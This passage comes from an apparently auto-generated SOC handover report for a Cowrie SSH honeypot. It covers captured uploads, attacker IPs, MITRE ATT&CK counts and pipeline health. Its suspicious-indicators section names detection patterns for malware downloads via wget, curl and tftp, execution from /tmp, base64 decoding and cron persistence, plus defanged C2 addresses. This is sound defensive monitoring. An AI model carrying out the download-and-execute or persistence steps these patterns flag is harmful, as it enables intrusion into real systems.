| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `185.99.6[.]50` | GE | JV A-Mobile Ltd. | **100** ⚠️ | 0 |
| `35.205.247[.]108` | BE | Google LLC | **100** ⚠️ | 1 |
| `193.47.62[.]69` | NL | BESTDC LIMITED | **100** ⚠️ | 50 |
| `2.57.122[.]238` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `77.239.124[.]130` | FR | ROCKET & MARINICA LTD | **100** ⚠️ | 18 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `217.24.168[.]208` | UA | PRIVATE JOINT-STOCK COMPANY FARLEP-INVEST | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 292 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 279 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 73 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 70 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 70 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 584 cases |
| Tool 34  | Credential Extractor        | ✅ 326 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 84 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 278 priority case(s) shown individually · 50 recon entry/entries in table (17 group(s) consolidating 248 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-03T14:17:08Z_
